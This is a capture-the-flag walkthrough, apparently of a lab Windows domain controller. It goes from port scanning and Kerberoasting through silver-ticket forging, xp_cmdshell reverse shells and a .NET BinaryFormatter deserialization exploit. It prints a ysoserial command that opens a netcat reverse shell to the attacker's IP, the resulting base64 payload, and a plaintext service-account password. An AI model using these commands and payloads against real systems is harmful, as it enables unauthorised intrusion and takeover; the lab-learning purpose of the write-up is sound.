## RUSTSCAN:
`PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-02-10 11:53:50Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-10T11:57:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-10T11:57:01+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
|_ssl-date: 2023-02-10T11:57:01+00:00; 0s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
|_ssl-date: 2023-02-10T11:57:01+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-10T11:57:01+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T15:30:57
| Not valid after:  2023-06-09T15:30:57
| MD5:   679cfca869ad25c086d2e8bb1792d7c3
| SHA-1: bda11c23bafc973e60b0d87cc893d298e2d54233
4411/tcp  open  found?        syn-ack ttl 127
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :`
* * *
## DNS:
From our Rustscan we saw that the FQDN should be DC1.scrm.local so let's dig for any record:
![058f3cedcc189c5fd0e8d811b8504717.png](../../_resources/058f3cedcc189c5fd0e8d811b8504717.png)

And we got an assurance about that we found the right DNS record.
* * *
## SMB:
let's try to run Enum4linux-ng and check what can we get from RPC/SMB:
![0e1753f85bce8116952c4f3e30c62ebb.png](../../_resources/0e1753f85bce8116952c4f3e30c62ebb.png)

Let's try to do it with a random user: nothing.

Checking manually for SMB shares: 
![fea478309454a31bf9f75935cb1c0002.png](../../_resources/fea478309454a31bf9f75935cb1c0002.png)

Nothing here, we may have to come back when we have a proper username
* * *
## KERBEROS:
We can run MSF and chek if we can find some users from Kerberos and maybe Kerberoast them, I will run a task in background and come back if i find something:
![7692c838a73b69298e22736a8628a15d.png](../../_resources/7692c838a73b69298e22736a8628a15d.png)

Here i had to check for tips and apparently we had  already a user "ksimpson" from the previous picture:
![a3fa0ab620404748e9ebe6f267e14be1.png](../../_resources/a3fa0ab620404748e9ebe6f267e14be1.png)

Now knowing as well from password reset form that username should match same as password can we kerberoas it?
![67fe3cbfa74af5cd48edb398a11de13a.png](../../_resources/67fe3cbfa74af5cd48edb398a11de13a.png)
![c79b48d6bbe4a86d700bc067ed1479bc.png](../../_resources/c79b48d6bbe4a86d700bc067ed1479bc.png)

We have his hash but we can't crack it nor can we pass it to Evil-Winrm. 
![c862e46d128184d669e8027a6373961c.png](../../_resources/c862e46d128184d669e8027a6373961c.png)
neither SMB is working...

Can we user Ksimpson to gain some TGT for SPN?
![76bfd05375bcfeb76c33443aa34e69d2.png](../../_resources/76bfd05375bcfeb76c33443aa34e69d2.png)

Nope! But checking for the error in Github seems related to NTLM that is disabled:
![b50225c7e958c823420955f5c41d3ba8.png](../../_resources/b50225c7e958c823420955f5c41d3ba8.png)
And is pointing to use the FQDN instead:
![f6616ba207394b3f834ccfa9bc07f3ba.png](../../_resources/f6616ba207394b3f834ccfa9bc07f3ba.png)

So if we try againg but with FQDN we get:
![ea9028fb6b60777d7d96b8b50a84661c.png](../../_resources/ea9028fb6b60777d7d96b8b50a84661c.png)

Now checking further on the chat seems like we much request a TGT ticket and save it first and then we can use that ticket since NTML auth is disabled it will fail otherwise:
![48d0eb34536efb866ab584fd0a0ee2d7.png](../../_resources/48d0eb34536efb866ab584fd0a0ee2d7.png)

Installing lastest impacket we can do it by using dc-ip option instead:
![ec17429d52746e78b17d5cfaae2c0fe6.png](../../_resources/ec17429d52746e78b17d5cfaae2c0fe6.png)

And the dev version saves us today, now we have a username:
![b37b94576ff5ebadd35cf6e51c85b27b.png](../../_resources/b37b94576ff5ebadd35cf6e51c85b27b.png)

And John can crack the hash for us:
![9a99d4b36e9e22fc270e3cc38109898f.png](../../_resources/9a99d4b36e9e22fc270e3cc38109898f.png)
* * *
## HTTP:
So far those webdirectories have been found:
![8bd1d8aaa9fcbe9b5fb38c83991bc9d0.png](../../_resources/8bd1d8aaa9fcbe9b5fb38c83991bc9d0.png)

Those subdomains have been found:
![26aa15ea3e25f4f77d772b2e52242279.png](../../_resources/26aa15ea3e25f4f77d772b2e52242279.png)

Starting with a manual enumeration we can find something juicy under: 
![aabdbdeb42674ad15dbd3b990f19e9cf.png](../../_resources/aabdbdeb42674ad15dbd3b990f19e9cf.png)
Wondering if we can inject our ip to linsten NTLM relays with Responder..

Moving on we can see that custom port 4461 is something app:
![4272c8a041f3ac5f7d3d08d3d10d861a.png](../../_resources/4272c8a041f3ac5f7d3d08d3d10d861a.png)

And we have a mail:
![0afef1ed2460413cea2d7ff6ac559510.png](../../_resources/0afef1ed2460413cea2d7ff6ac559510.png)

Password reset is not working:
![a19357d596904c333f7c02c8b6b53b07.png](../../_resources/a19357d596904c333f7c02c8b6b53b07.png)

And we can create a user??
![4319bfe5111b4bd9c498a8e06d723fb7.png](../../_resources/4319bfe5111b4bd9c498a8e06d723fb7.png)
* * *
## Kerberos Tickets:
Now we have a TGT ticket for the user SQLSVC but we can't login.
Now i tried smbclient but gave me error most likely because ot NTML disabled but using smbclient from impacket with kerberos gives us what we need:
![797ee12a0c9f3fd46dafde4a8f4cb76d.png](../../_resources/797ee12a0c9f3fd46dafde4a8f4cb76d.png)

So far Ksimpson had access only to Public share where we could grab a pdf:
![e9c308becbdcf10e3276d388f6ec2cd8.png](../../_resources/e9c308becbdcf10e3276d388f6ec2cd8.png)
![11f9f1500be3a80eb381256b882da0d2.png](../../_resources/11f9f1500be3a80eb381256b882da0d2.png)

The pdf mentions about a SQL server, and we have SQL service TGT ticket so we know we can grab 2 type of Kerberos tickets Golden (Best: used by users) and Silver (Not Best: but used by Computer objects or serviceaccounts like SQL etc)
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket

First we need to grab the Domain SID:
![02d39251be5b3a8b36f2af291b414081.png](../../_resources/02d39251be5b3a8b36f2af291b414081.png)

After we generate the NTLM hash of the Password:
![b7b6cadcbd0e7f6f88a7751fc43fbef3.png](../../_resources/b7b6cadcbd0e7f6f88a7751fc43fbef3.png)

We can generate an impersonation ticket(Silver) so we can impersonate as Administrator on the machine:
![90acc6f7636f6522b7ba2e3cfca2a598.png](../../_resources/90acc6f7636f6522b7ba2e3cfca2a598.png)

Now we need to set an alias to the ticket:
![0f5431640cce01a4fbca23fe3a0f2f1a.png](../../_resources/0f5431640cce01a4fbca23fe3a0f2f1a.png)

And now we can login into MSSQL server as Administrator:
![3fa363496f2b432d234c3dea42c7b17e.png](../../_resources/3fa363496f2b432d234c3dea42c7b17e.png)

* * *
## SQL:
Now thatb we are in, we should do a database enumeration to see if we can grab some other credentials:
DB on the machine:
![47f9d418005aa10ea4fd416ca74f5a24.png](../../_resources/47f9d418005aa10ea4fd416ca74f5a24.png)

List Tables:
![c7b090595a1d8cf68da2f1d7ce1bdbad.png](../../_resources/c7b090595a1d8cf68da2f1d7ce1bdbad.png)

And we have another account?
![4fbb1c7fe1703beb671eb8f610ba94a8.png](../../_resources/4fbb1c7fe1703beb671eb8f610ba94a8.png)

But the user seems not like gives us any access to the machine. Knowing we are admin on the MSSQL we can enable the XP_CMDSHELL:
![e897aa4e241500757d07299f5835d022.png](../../_resources/e897aa4e241500757d07299f5835d022.png)

And now can we execute a Powershell revshell?
![a664397e055d9f034b941121fa4d5446.png](../../_resources/a664397e055d9f034b941121fa4d5446.png)
Tried but it din't worked, so we must use another:https://www.revshells.com/
The base64 encoded seems working:
![1abf92666fc7aac22e25cdb3ab3d83ca.png](../../_resources/1abf92666fc7aac22e25cdb3ab3d83ca.png)
* * *
## PRIVESC:
Now that we are in we can continue from inside:
![71804eb3855810defd2720abb4ce23de.png](../../_resources/71804eb3855810defd2720abb4ce23de.png)

Seems like we are still like svcsql and we must elevate ourself to MiscSVC instead..
![d896f80ecaef9f39468c03cd9e52b346.png](../../_resources/d896f80ecaef9f39468c03cd9e52b346.png)

So i decided to upload both nc.exe and runas.exe(https://github.com/antonioCoco/RunasCs/releases/tag/v1.4):
![1d9cfe8ce60b45c5f5beecd7d8ad698b.png](../../_resources/1d9cfe8ce60b45c5f5beecd7d8ad698b.png)

Edit nothig is working i will get a tips from another user: 
`$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $SecPassword)
Invoke-Command -Computer dc1 -Credential $Cred -ScriptBlock {<SAME PAYLOAD AS BEFORE>}`
![879f533735136903fc993667a52785fa.png](../../_resources/879f533735136903fc993667a52785fa.png)

And we have a nc shell as Misc so we can grab the first flag.
* * *
## Root:
I generated a meterpreter payload and uploaded on the machine, then i run the exe to get a proper shell as MISCSVC:
![c9c53ec3a9aa0eb27254bddf300e7d9e.png](../../_resources/c9c53ec3a9aa0eb27254bddf300e7d9e.png)
![379147002aeec354f76395fe9811a5d4.png](../../_resources/379147002aeec354f76395fe9811a5d4.png)

Now we can check Shares and see what can we do about that custom Order App running on port 4411:
![46d5d72b51f59e2dec7f7d0ee53e082a.png](../../_resources/46d5d72b51f59e2dec7f7d0ee53e082a.png)

Let's download the DLL and check what commands the program what to have. Do do it i installed .net 7.0, mono and MonoDev(IDE) so I can check the code.
But then i found another alternative that mught work even better:
https://github.com/icsharpcode/AvaloniaILSpy

Under the Logon class we can see find a devuser that bypassed the login in the application client:
![0b0cdd55e95e5d87f29d733179d18f24.png](../../_resources/0b0cdd55e95e5d87f29d733179d18f24.png)

here can we see the 2 commands that are accepted by the application:
![8ab8cd9358f0eb25eb10e21e48692580.png](../../_resources/8ab8cd9358f0eb25eb10e21e48692580.png)

Trying to list the orders:
![06ef0f1f12bfacb9d5c6413187eda928.png](../../_resources/06ef0f1f12bfacb9d5c6413187eda928.png)

Now from the result we know it's base64 encoded but we must see how is handled UPLOAD_ORDER:
![8f2f8c40e35dde2d8ccf5712d58a459b.png](../../_resources/8f2f8c40e35dde2d8ccf5712d58a459b.png)
And here we see that .net serialization in base64 is involved and Binary Formatter is used:
![cdaeb90f1ab165ab408751d4aa2a8bc6.png](../../_resources/cdaeb90f1ab165ab408751d4aa2a8bc6.png)
![9d73b5011bee9a1647deecbc1453f0c5.png](../../_resources/9d73b5011bee9a1647deecbc1453f0c5.png)

Now we have everything we need to exploit it withysoserial.net :
![a22727bf0545b0ba78fafea23ae69a1b.png](../../_resources/a22727bf0545b0ba78fafea23ae69a1b.png)
It's crashing. maybe cause it's too long. Let's try to use nc instead:
`ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 -c "powershell -c C:\temp\nc.exe -e cmd.exe 10.10.14.8 7777"`

Here after several tries I had to use it on my Windows VM:
`PS C:\Users\AleksandarMilosavlje\Downloads\ysoserial-1.35\Release> .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\temp\nc.exe -e cmd.exe 10.10.14.8 7777"
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA9AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMkFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhIUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDNWxlR1VnTVRBdU1UQXVNVFF1T0NBM056YzNJaUJUZEdGdVpHRnlaRVZ5Y205eVJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlRkR0Z1WkdGeVpFOTFkSEIxZEVWdVkyOWthVzVuUFNKN2VEcE9kV3hzZlNJZ1ZYTmxjazVoYldVOUlpSWdVR0Z6YzNkdmNtUTlJbnQ0T2s1MWJHeDlJaUJFYjIxaGFXNDlJaUlnVEc5aFpGVnpaWEpRY205bWFXeGxQU0pHWVd4elpTSWdSbWxzWlU1aGJXVTlJbU50WkNJZ0x6NE5DaUFnSUNBZ0lEd3ZjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdQQzl6WkRwUWNtOWpaWE56UGcwS0lDQThMMDlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVQWW1wbFkzUkpibk4wWVc1alpUNE5Dand2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5UGdzPQs=
PS C:\Users\AleksandarMilosavlje\Downloads\ysoserial-1.35\Release>`

Now we should try to add the order and hope that it will execute the command instead:
![f22d74a21d17c8afbcbf620c0a69a7f1.png](../../_resources/f22d74a21d17c8afbcbf620c0a69a7f1.png)

Sending UPLOAD_ORDER;<payload> invoked a shell as NTSystem:
![026c0091b08acded0295298cd84fa4cc.png](../../_resources/026c0091b08acded0295298cd84fa4cc.png)

Now grab last flag:
![6ed877416c514050b7b68ffc5eca0654.png](../../_resources/6ed877416c514050b7b68ffc5eca0654.png)





* * *